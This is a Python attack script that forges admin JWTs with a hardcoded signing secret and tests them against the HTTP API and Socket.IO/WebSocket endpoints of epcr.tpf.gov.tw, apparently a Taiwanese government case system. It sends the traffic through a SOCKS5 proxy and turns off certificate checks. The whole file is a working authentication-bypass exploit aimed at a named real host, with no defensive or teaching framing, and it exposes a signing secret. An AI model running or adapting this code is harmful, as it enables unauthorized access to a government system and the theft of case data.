#!/usr/bin/env python3
"""
EPCR JWT Forge v2 - test on correct ports
Port 4000: HTTP API (case/push, auth)
Port 4004: Socket.IO (handshake, WebSocket)
"""
import requests, json, time, ssl, re, threading
import datetime
import jwt as pyjwt
from websocket import WebSocketApp

PROXY_HOST = "202.160.76.157"
PROXY_PORT = 11081
JWT_SECRET = "ru/3xu4dkru4888"
SERVER = "epcr.tpf.gov.tw"
HTTP_PORT = 4000
SOCKET_PORT = 4004

def forge_jwt(account="admin", role="ADMIN", user_id=1, expires_hours=48):
    payload = {
        "sub": str(user_id),
        "account": account,
        "role": role,
        "iat": datetime.datetime.now(datetime.timezone.utc),
        "exp": datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=expires_hours),
    }
    return pyjwt.encode(payload, JWT_SECRET, algorithm="HS256")

# ─── Phase 1: Test forged JWT on HTTP port 4000 ───
print("=== Phase 1: HTTP API on port 4000 with forged JWT ===\n")
token = forge_jwt(account="admin", role="ADMIN", user_id=1)
print(f"JWT Secret: {JWT_SECRET}")
print(f"Forged JWT: {token[:80]}...")

S = "socks5://{}:{}".format(PROXY_HOST, PROXY_PORT)

# Test /case/push with forged JWT
resp = requests.get(
    f"https://{SERVER}:{HTTP_PORT}/case/push",
    params={"token": token},
    proxies={"https": S}, verify=False, timeout=10,
)
print(f"\nGET /case/push (with JWT): HTTP {resp.status_code}")
print(f"Body: {resp.text[:300]}")

# Test /auth/profile with forged JWT
resp = requests.get(
    f"https://{SERVER}:{HTTP_PORT}/auth/profile",
    params={"token": token},
    proxies={"https": S}, verify=False, timeout=10,
)
print(f"\nGET /auth/profile: HTTP {resp.status_code}")
print(f"Body: {resp.text[:300]}")

# Test with Bearer header
resp = requests.get(
    f"https://{SERVER}:{HTTP_PORT}/auth/profile",
    headers={"Authorization": f"Bearer {token}"},
    proxies={"https": S}, verify=False, timeout=10,
)
print(f"\nGET /auth/profile (Bearer): HTTP {resp.status_code}")
print(f"Body: {resp.text[:300]}")

# Test /case/list
resp = requests.get(
    f"https://{SERVER}:{HTTP_PORT}/case/list",
    params={"token": token},
    proxies={"https": S}, verify=False, timeout=10,
)
print(f"\nGET /case/list: HTTP {resp.status_code}")
print(f"Body: {resp.text[:300]}")

# Test root path
resp = requests.get(
    f"https://{SERVER}:{HTTP_PORT}/",
    proxies={"https": S}, verify=False, timeout=10,
)
print(f"\nGET /: HTTP {resp.status_code}")
print(f"Body: {resp.text[:300]}")

# ─── Phase 2: Socket.IO handshake with JWT ───
print("\n\n=== Phase 2: Socket.IO handshake with JWT (port 4004) ===\n")

sess = requests.Session()
sess.proxies = {"https": S}
sess.verify = False

# Handshake with token in initial request
resp = sess.get(
    f"https://{SERVER}:{SOCKET_PORT}/socket.io/",
    params={"EIO": "4", "transport": "polling", "token": token, "t": str(int(time.time()*1000))},
    timeout=10,
)
print(f"Handshake with token: HTTP {resp.status_code}")
print(f"Body: {resp.text[:300]}")

sid_match = re.search(r'"sid":"([^"]+)"', resp.text)
if sid_match:
    sid = sid_match.group(1)
    print(f"SID: {sid}")
    
    # Send CONNECT with JWT in polling
    connect_data = f'2:40{{"token":"{token}"}}'
    resp2 = sess.post(
        f"https://{SERVER}:{SOCKET_PORT}/socket.io/",
        params={"EIO": "4", "transport": "polling", "sid": sid, "t": str(int(time.time()*1000))},
        data=connect_data,
        timeout=10,
    )
    print(f"\nCONNECT with JWT: HTTP {resp2.status_code}")
    print(f"Body: {resp2.text[:300]}")
    
    # Long-poll receive
    resp3 = sess.get(
        f"https://{SERVER}:{SOCKET_PORT}/socket.io/",
        params={"EIO": "4", "transport": "polling", "sid": sid, "t": str(int(time.time()*1000))},
        timeout=30,
    )
    print(f"\nLong-poll: HTTP {resp3.status_code}")
    print(f"Body: {resp3.text[:300]}")

# ─── Phase 3: WebSocket CONNECT with JWT payload ───
print("\n\n=== Phase 3: WebSocket CONNECT with JWT payload ===\n")
token_short = forge_jwt(account="admin", role="ADMIN", user_id=1)
print(f"JWT Secret: {JWT_SECRET}")
print(f"Token: {token_short[:60]}...")

# Fresh handshake (without token first)
resp = sess.get(
    f"https://{SERVER}:{SOCKET_PORT}/socket.io/",
    params={"EIO": "4", "transport": "polling", "t": str(int(time.time()*1000))},
    timeout=10,
)
sid2 = re.search(r'"sid":"([^"]+)"', resp.text)
if sid2:
    sid = sid2.group(1)
    ws_url = f"wss://{SERVER}:{SOCKET_PORT}/socket.io/?EIO=4&transport=websocket&sid={sid}"
    print(f"WS URL: {ws_url}")
    
    messages = []
    def on_message(ws, msg):
        if isinstance(msg, bytes): msg = msg.decode('utf-8', errors='replace')
        print(f"  \n  MSG: {msg[:500]}")
        messages.append(msg)
    
    def on_open(ws):
        print("  WS Open")
        # Send CONNECT with JWT
        ws.send(f'40{{"token":"{token_short}"}}')
        print(f"  Sent: 40{{\"token\":\"...\"}}")
    
    def on_close(ws, *args):
        print("  WS Closed")
    
    def on_error(ws, err):
        print(f"  WS Err: {err}")
    
    ws = WebSocketApp(ws_url, on_message=on_message, on_open=on_open,
                      on_close=on_close, on_error=on_error)
    t = threading.Thread(target=ws.run_forever, kwargs={
        "http_proxy_host": PROXY_HOST,
        "http_proxy_port": PROXY_PORT,
        "proxy_type": "socks5",
        "sslopt": {"cert_reqs": ssl.CERT_NONE},
        "ping_interval": 20,
        "ping_timeout": 10,
    })
    t.daemon = True
    t.start()
    t.join(timeout=20)
    print(f"  Messages received: {len(messages)}")

# ─── Phase 4: WebSocket with token in URL ───
print("\n\n=== Phase 4: WebSocket with EIO token query param ===\n")
token3 = forge_jwt(account="admin", role="ADMIN", user_id=1)
resp = sess.get(
    f"https://{SERVER}:{SOCKET_PORT}/socket.io/",
    params={"EIO": "4", "transport": "polling", "t": str(int(time.time()*1000))},
    timeout=10,
)
sid3 = re.search(r'"sid":"([^"]+)"', resp.text)
if sid3:
    sid = sid3.group(1)
    ws_url = f"wss://{SERVER}:{SOCKET_PORT}/socket.io/?EIO=4&transport=websocket&sid={sid}&token={token3}"
    print(f"WS URL (with token): {ws_url[:100]}...")
    
    messages2 = []
    def on_message2(ws, msg):
        if isinstance(msg, bytes): msg = msg.decode('utf-8', errors='replace')
        print(f"  \n  MSG: {msg[:500]}")
        messages2.append(msg)
    
    def on_open2(ws):
        print("  WS Open (no message sent)")
    
    def on_close2(ws, *args):
        print("  WS Closed")
    
    def on_error2(ws, err):
        print(f"  WS Err: {err}")
    
    ws2 = WebSocketApp(ws_url, on_message=on_message2, on_open=on_open2,
                       on_close=on_close2, on_error=on_error2)
    t2 = threading.Thread(target=ws2.run_forever, kwargs={
        "http_proxy_host": PROXY_HOST,
        "http_proxy_port": PROXY_PORT,
        "proxy_type": "socks5",
        "sslopt": {"cert_reqs": ssl.CERT_NONE},
        "ping_interval": 20,
        "ping_timeout": 10,
    })
    t2.daemon = True
    t2.start()
    t2.join(timeout=20)
    print(f"  Messages received: {len(messages2)}")

print("\n=== Done ===")
